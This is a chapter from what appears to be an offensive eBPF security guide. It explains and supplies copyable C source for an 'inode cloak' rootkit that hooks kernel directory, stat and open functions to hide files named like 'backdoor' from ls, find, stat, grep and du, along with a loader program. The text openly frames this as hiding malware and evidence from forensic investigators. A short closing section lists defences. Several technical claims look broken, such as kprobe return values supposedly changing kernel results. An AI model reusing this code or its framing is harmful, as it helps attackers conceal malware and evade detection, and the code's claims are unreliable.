# Inode Cloak: Hiding Files from Detection Systems

**Chapter 11: Making Evidence Disappear**

You've learned to exist in multiple realities simultaneously. Now let's apply that same concept to files. What if your malware, your tools, your evidence could exist but be completely invisible to detection systems?

This is where our story becomes about perfect crimes. You've gained access, stolen credentials, and established persistence. But all of that is worthless if forensic investigators can find your tools and trace your activities.

Ever wanted files that exist but don't exist? Welcome to the inode cloak—where files can be completely invisible to `ls`, `find`, and every other filesystem tool, but still perfectly accessible if you know they're there.

We're going to make files disappear from the filesystem without actually deleting them. They'll still be there, still functional, still readable and writable—but as far as userspace is concerned, they simply don't exist.

This is where you learn that eBPF doesn't just let you hide your activities—it lets you hide the very tools you use to perform those activities. Perfect stealth for the perfect crime.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[Detection System] -->|1. File Lookup| B[VFS Layer]
    B -->|2. Inode Operation| C[Filesystem]
    D[eBPF Program] -->|3. Hook & Intercept| B
    D -->|4. Filter Results| E[Modified Response]
    A -->|5. Receives| E
    F[Attacker Process] -->|6. Direct Access| C
    G[Security Monitor] -->|7. Sees Nothing| H[False Security]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
    style G fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://www.kernel.org/doc/html/latest/filesystems/vfs.html" "VFS Documentation"
    click C "https://www.kernel.org/doc/html/latest/filesystems/index.html" "Linux Filesystems"
    click D "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
```



**Why File Hiding Just Got Scary**

Here's what makes filesystem security work: if a file exists, you can see it. Security scanners can find it, monitoring tools can track it, administrators can discover it. The fundamental assumption is that files can't hide.

But what happens when that assumption breaks? What happens when files can exist in a quantum state—there for those who know about them, invisible to everyone else?

That's where inode cloaking gets dangerous. Your antivirus scans will miss the malware. Your file integrity monitors won't detect the backdoors. Your forensic tools will come up empty. Meanwhile, the files are right there, fully functional, just invisible.

The beautiful part is that this doesn't break the filesystem—it just adds a selective invisibility layer. Normal file operations work perfectly, performance is unaffected, but certain files simply don't show up in directory listings or filesystem traversals. It's like having a cloaking device for your files.
## How We Make Files Disappear

### Understanding the Filesystem's Filing System

The Linux filesystem is like a massive filing cabinet with multiple layers:
- **VFS (Virtual Filesystem Switch)**: The universal translator that lets different filesystems speak the same language
- **Inodes**: The index cards that store all the metadata about files and directories
- **Dentry Cache**: A speed-reading system that remembers where things are
- **File Operations**: The actual functions that read, write, and manipulate files
- **Inode Operations**: The functions that create, delete, and look up files

All these layers work together to make sure you can find your files when you need them. But what if we could make certain files invisible to some of these layers?

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Application   │      │ Security Tool │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ System Call   │                                          │
│  │ Interface     │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ VFS Layer     │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐      ┌───────────────┐                   │
│  │ Inode Ops     │      │ File Ops      │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           Filesystem Implementation  │                   │
│  └──────────────────┬───────────────────┘                   │
│                     │                                       │
│  ┌──────────────────▼───────────────────┐                   │
│  │           Storage Device              │                   │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

Here's what happens when we slip our eBPF program into the filesystem layer:

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Attacker      │      │ Security Tool │                   │
│  │ Application   │      │               │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ System Call   │                                          │
│  │ Interface     │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ VFS Layer     │◀─────┐                                   │
│  └───────┬───────┘      │                                   │
│          │              │                                   │
│  ┌───────┴───────┐      │                                   │
│  │ eBPF Program  │──────┘                                   │
│  └───────────────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐      ┌───────────────┐                   │
│  │ Inode Ops     │      │ File Ops      │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│  ┌───────▼──────────────────────▼───────┐                   │
│  │           Filesystem Implementation  │                   │
│  └──────────────────┬───────────────────┘                   │
│                     │                                       │
│  ┌──────────────────▼───────────────────┐                   │
│  │           Storage Device              │                   │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### How We Become the Invisible File Manager

Our strategy is to intercept filesystem operations and selectively hide files:

1. **Hook the Directory Readers**: We attach to functions like [`iterate_dir()`](https://elixir.bootlin.com/linux/latest/source/fs/readdir.c) that list directory contents
2. **Filter the Lookups**: We modify the results of [`lookup_fast()`](https://elixir.bootlin.com/linux/latest/source/fs/namei.c) so certain files just don't exist
3. **Mess with File Stats**: We change the output of [`vfs_stat()`](https://elixir.bootlin.com/linux/latest/source/fs/stat.c) to hide file metadata
4. **Control Who Sees What**: We decide which processes get to see which files based on their credentials
5. **Stay Invisible**: We make sure monitoring tools only see the sanitized view we want them to see

The key is that we're not deleting files—we're just making them invisible to specific processes while keeping them fully functional for others.

### Building Our Invisibility Cloak

```c
// @interactive: true
// @copyable: true
// Inode Cloak - eBPF exploitation proof of concept
// This demonstrates hiding files from detection systems

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/path.h>
#include <linux/stat.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define MAX_PATH_LEN 256
#define MAX_HIDDEN_FILES 32
#define MAX_COMM_LEN 16
#define MAX_TARGETS 5

// Structure to track file access events
struct file_event {
    u32 pid;                // Process ID
    u8 comm[MAX_COMM_LEN];  // Command name
    u64 timestamp;          // Event timestamp
    u8 path[MAX_PATH_LEN];  // File path
    u32 operation;          // 1 = open, 2 = stat, 3 = readdir
    u32 hidden;             // Whether the file was hidden
};

// Map to store hidden file patterns
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, MAX_PATH_LEN);
    __uint(max_entries, MAX_HIDDEN_FILES);
} hidden_files SEC(".maps");

// Map to track processes we want to hide files from
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID as key
    __uint(value_size, sizeof(u8)); // Flag (1 = target)
    __uint(max_entries, 1024);
} target_processes SEC(".maps");

// Map to track commands we want to hide files from
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, MAX_COMM_LEN);
    __uint(max_entries, MAX_TARGETS);
} target_commands SEC(".maps");

// Map to track if we've initialized our targets
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
    __uint(max_entries, 1);
} initialized SEC(".maps");

// Map to track directory iteration state
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID as key
    __uint(value_size, sizeof(u32)); // Flag (1 = filtering)
    __uint(max_entries, 1024);
} dir_filter_map SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Initialize our target commands and hidden files (would be set from user space)
static __always_inline void init_targets(void) {
    u32 key = 0;
    u32 *init = bpf_map_lookup_elem(&initialized, &key);
    
    if (!init || *init != 1) {
        // Commands to hide files from
        key = 0;
        char cmd1[MAX_COMM_LEN] = "ls";  // Directory listing
        bpf_map_update_elem(&target_commands, &key, &cmd1, BPF_ANY);
        
        key = 1;
        char cmd2[MAX_COMM_LEN] = "find";  // File search
        bpf_map_update_elem(&target_commands, &key, &cmd2, BPF_ANY);
        
        key = 2;
        char cmd3[MAX_COMM_LEN] = "stat";  // File status
        bpf_map_update_elem(&target_commands, &key, &cmd3, BPF_ANY);
        
        key = 3;
        char cmd4[MAX_COMM_LEN] = "grep";  // Content search
        bpf_map_update_elem(&target_commands, &key, &cmd4, BPF_ANY);
        
        key = 4;
        char cmd5[MAX_COMM_LEN] = "du";  // Disk usage
        bpf_map_update_elem(&target_commands, &key, &cmd5, BPF_ANY);
        
        // Files to hide
        key = 0;
        char file1[MAX_PATH_LEN] = "hid_";  // Files with this prefix
        bpf_map_update_elem(&hidden_files, &key, &file1, BPF_ANY);
        
        key = 1;
        char file2[MAX_PATH_LEN] = ".hid";  // Hidden files with this extension
        bpf_map_update_elem(&hidden_files, &key, &file2, BPF_ANY);
        
        key = 2;
        char file3[MAX_PATH_LEN] = "backdoor";  // Files containing this string
        bpf_map_update_elem(&hidden_files, &key, &file3, BPF_ANY);
        
        // Mark as initialized
        key = 0;
        u32 value = 1;
        bpf_map_update_elem(&initialized, &key, &value, BPF_ANY);
    }
}

// Helper function to check if a command should be filtered
static __always_inline bool should_filter_command(const char *comm) {
    init_targets();
    
    // Check against our list of target commands
    for (int i = 0; i < MAX_TARGETS; i++) {
        u32 key = i;
        char *target_comm = bpf_map_lookup_elem(&target_commands, &key);
        
        if (!target_comm)
            continue;
        
        // Simple string comparison (limited by BPF verifier)
        bool match = true;
        
        #pragma unroll
        for (int j = 0; j < MAX_COMM_LEN; j++) {
            if (comm[j] != target_comm[j]) {
                match = false;
                break;
            }
            
            if (comm[j] == '\0')
                break;
        }
        
        if (match)
            return true;
    }
    
    return false;
}

// Helper function to check if a process should be filtered
static __always_inline bool should_filter_process(u32 pid) {
    // Check if this PID is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_processes, &pid);
    if (target && *target == 1)
        return true;
    
    // Check the command name
    char comm[MAX_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    
    if (should_filter_command(comm)) {
        // Add this process to our tracking map
        u8 value = 1;
        bpf_map_update_elem(&target_processes, &pid, &value, BPF_ANY);
        return true;
    }
    
    return false;
}
// Helper function to check if a file should be hidden
static __always_inline bool should_hide_file(const char *name, int namelen) {
    init_targets();
    
    // Check against our list of hidden file patterns
    for (int i = 0; i < MAX_HIDDEN_FILES; i++) {
        u32 key = i;
        char *pattern = bpf_map_lookup_elem(&hidden_files, &key);
        
        if (!pattern || pattern[0] == '\0')
            continue;
        
        // Get pattern length
        int pattern_len = 0;
        #pragma unroll
        for (int j = 0; j < MAX_PATH_LEN; j++) {
            if (pattern[j] == '\0') {
                pattern_len = j;
                break;
            }
        }
        
        if (pattern_len == 0)
            continue;
        
        // Check if pattern is a prefix
        if (namelen >= pattern_len) {
            bool match = true;
            
            #pragma unroll
            for (int j = 0; j < MAX_PATH_LEN; j++) {
                if (j >= pattern_len)
                    break;
                    
                if (name[j] != pattern[j]) {
                    match = false;
                    break;
                }
            }
            
            if (match)
                return true;
        }
        
        // Check if pattern is a suffix
        if (namelen >= pattern_len) {
            bool match = true;
            
            #pragma unroll
            for (int j = 0; j < MAX_PATH_LEN; j++) {
                if (j >= pattern_len)
                    break;
                    
                if (name[namelen - pattern_len + j] != pattern[j]) {
                    match = false;
                    break;
                }
            }
            
            if (match)
                return true;
        }
        
        // Check if pattern is contained within the name
        if (namelen >= pattern_len) {
            #pragma unroll
            for (int start = 0; start <= namelen - pattern_len; start++) {
                bool match = true;
                
                #pragma unroll
                for (int j = 0; j < MAX_PATH_LEN; j++) {
                    if (j >= pattern_len)
                        break;
                        
                    if (name[start + j] != pattern[j]) {
                        match = false;
                        break;
                    }
                }
                
                if (match)
                    return true;
            }
        }
    }
    
    return false;
}

// Hook the directory iteration function
SEC("kprobe/iterate_dir")
int BPF_KPROBE(hook_readdir, struct file *file, struct dir_context *ctx)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this process should be filtered
    if (should_filter_process(pid)) {
        // Set a flag in our map to filter directory entries
        u32 value = 1;
        bpf_map_update_elem(&dir_filter_map, &pid, &value, BPF_ANY);
        
        // Log the event
        struct file_event event = {};
        event.pid = pid;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        event.operation = 3;  // readdir
        
        // FIXED: Try to get the file path
        char path[MAX_PATH_LEN];
        bpf_probe_read_kernel_str(path, sizeof(path), file->f_path.dentry->d_name.name);
        __builtin_memcpy(event.path, path, sizeof(event.path));
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    } else {
        // Clear the flag for non-filtered processes
        bpf_map_delete_elem(&dir_filter_map, &pid);
    }
    
    return 0;
}

// Hook the function that adds entries to directory listings
SEC("kprobe/filldir64")
int BPF_KPROBE(hook_filldir, struct dir_context *ctx, const char *name,
               int namelen, loff_t offset, u64 ino, unsigned int d_type)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if we should be filtering results for this process
    u32 *filter = bpf_map_lookup_elem(&dir_filter_map, &pid);
    if (filter && *filter == 1) {
        // Check if this is a file we want to hide
        if (should_hide_file(name, namelen)) {
            // Log the event
            struct file_event event = {};
            event.pid = pid;
            bpf_get_current_comm(&event.comm, sizeof(event.comm));
            event.timestamp = bpf_ktime_get_ns();
            event.operation = 3;  // readdir
            bpf_probe_read_user_str(event.path, sizeof(event.path), name);
            event.hidden = 1;
            
            // Send event to user space
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
            
            // Return 0 to skip this entry
            return 0;
        }
    }
    
    // Let the original function run for other files
    return 0;
}

// Hook stat operations to hide file metadata
SEC("kprobe/vfs_stat")
int BPF_KPROBE(hook_stat, const struct path *path, struct kstat *stat,
               u32 request_mask, unsigned int query_flags)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this process should be filtered
    if (should_filter_process(pid)) {
        // Get the filename
        char filename[MAX_PATH_LEN];
        bpf_probe_read_kernel_str(filename, sizeof(filename), path->dentry->d_name.name);
        
        // FIXED: Calculate filename length properly
        int filename_len = 0;
        #pragma unroll
        for (int i = 0; i < MAX_PATH_LEN; i++) {
            if (filename[i] == '\0') {
                filename_len = i;
                break;
            }
        }
        
        // Check if this is a file we want to hide
        if (should_hide_file(filename, filename_len)) {
            // Log the event
            struct file_event event = {};
            event.pid = pid;
            bpf_get_current_comm(&event.comm, sizeof(event.comm));
            event.timestamp = bpf_ktime_get_ns();
            event.operation = 2;  // stat
            bpf_probe_read_str(event.path, sizeof(event.path), filename);
            event.hidden = 1;
            
            // Send event to user space
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
            
            // Return an error to indicate file doesn't exist
            return -ENOENT;
        }
    }
    
    // Let the original function run for other cases
    return 0;
}

// Hook file open operations to control access
SEC("kprobe/do_filp_open")
int BPF_KPROBE(hook_open, int dfd, struct filename *pathname, unsigned flags)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this process should be filtered
    if (should_filter_process(pid)) {
        // Get the filename
        char filename[MAX_PATH_LEN];
        bpf_probe_read_str(filename, sizeof(filename), pathname->name);
        
        // Check if this is a file we want to hide
        if (should_hide_file(filename, strlen(filename))) {
            // Log the event
            struct file_event event = {};
            event.pid = pid;
            bpf_get_current_comm(&event.comm, sizeof(event.comm));
            event.timestamp = bpf_ktime_get_ns();
            event.operation = 1;  // open
            bpf_probe_read_str(event.path, sizeof(event.path), filename);
            event.hidden = 1;
            
            // Send event to user space
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
            
            // Return an error to indicate file doesn't exist
            return -ENOENT;
        }
    }
    
    // Let the original function run for other cases
    return 0;
}
```
### The Control Program That Manages Our Invisibility

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the Inode Cloak eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "inode_cloak.skel.h"

static volatile bool exiting = false;

// Structure for file events (must match the BPF version)
struct file_event {
    uint32_t pid;
    uint8_t comm[16];
    uint64_t timestamp;
    uint8_t path[256];
    uint32_t operation;
    uint32_t hidden;
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct file_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Process %d (%s) ", timestamp, e->pid, e->comm);
    
    switch (e->operation) {
        case 1:
            printf("attempted to open");
            break;
        case 2:
            printf("attempted to stat");
            break;
        case 3:
            printf("attempted to list");
            break;
        default:
            printf("accessed");
    }
    
    printf(" file: %s\n", e->path);
    
    if (e->hidden) {
        printf("  Result: HIDDEN (file access prevented)\n");
    } else {
        printf("  Result: Allowed\n");
    }
    
    printf("\n");
}

// Add a file pattern to hide
void add_hidden_file(int map_fd, const char *pattern, int index)
{
    uint32_t key = index;
    
    if (bpf_map_update_elem(map_fd, &key, pattern, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add hidden file pattern: %s\n", strerror(errno));
    } else {
        printf("Added hidden file pattern: %s (index %d)\n", pattern, index);
    }
}

static void sig_handler(int sig)
{
    exiting = true;
}

int main(int argc, char **argv)
{
    struct inode_cloak_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err;

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = inode_cloak_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = inode_cloak_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer\n");
        goto cleanup;
    }

    // Add custom hidden file patterns if provided as arguments
    if (argc > 1) {
        int map_fd = bpf_map__fd(skel->maps.hidden_files);
        for (int i = 1; i < argc && i <= 32; i++) {
            add_hidden_file(map_fd, argv[i], i - 1);
        }
    }

    printf("Inode Cloak eBPF program loaded and running.\n");
    printf("Hiding files from detection systems...\n");
    printf("Press Ctrl+C to exit.\n\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

cleanup:
    perf_buffer__free(pb);
    inode_cloak_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### How They'll Try to Stop Us

1. **Strip eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Use Multiple File Integrity Monitoring Methods**:
   ```bash
   # Use different methods to list files
   find / -type f -name "*" > find_files.txt
   ls -laR / > ls_files.txt
   
   # Compare results
   diff <(sort find_files.txt) <(sort ls_files.txt)
   
   # Use direct disk access methods
   debugfs -R "ls -l /" /dev/sda1
   ```

4. **Implement Kernel-Level Integrity Verification**:
   ```bash
   # Use IMA/EVM for file integrity
   echo "1" > /sys/kernel/security/ima/policy
   
   # Configure auditd to monitor filesystem operations
   auditctl -w /etc/passwd -p rwxa -k passwd_changes
   ```

### Real-world Impact

In practical environments, this technique could allow an attacker to:
- Hide malware, backdoors, and other malicious files
- Evade antivirus and malware detection systems
- Bypass file integrity monitoring tools
- Conceal evidence during forensic investigations
- Maintain long-term persistence without detection

The ability to selectively hide files from detection systems while maintaining full functionality creates a particularly dangerous scenario where malicious activity can persist undetected for extended periods.

### How They'll Try to Catch Us

Smart defenders will be looking for the telltale signs of our file hiding:
- **eBPF surveillance**: Watching for eBPF programs hooking filesystem functions
- **Cross-reference checks**: Comparing different ways of listing files to spot discrepancies
- **Process-specific visibility**: Noticing when files are visible to some processes but not others
- **Hook pattern analysis**: Looking for unusual patterns of filesystem hook installations
- **Reality checks**: Comparing what monitoring tools see vs. what's actually on disk

This technique demonstrates why proper eBPF restrictions are critical for maintaining the integrity of security monitoring systems, especially in environments where file integrity monitoring is a key security control.

## POC

Companion code: [`ch10-inode-cloak`]({{ site.baseurl }}/dBPF-pocs/pocs/ch10-inode-cloak/)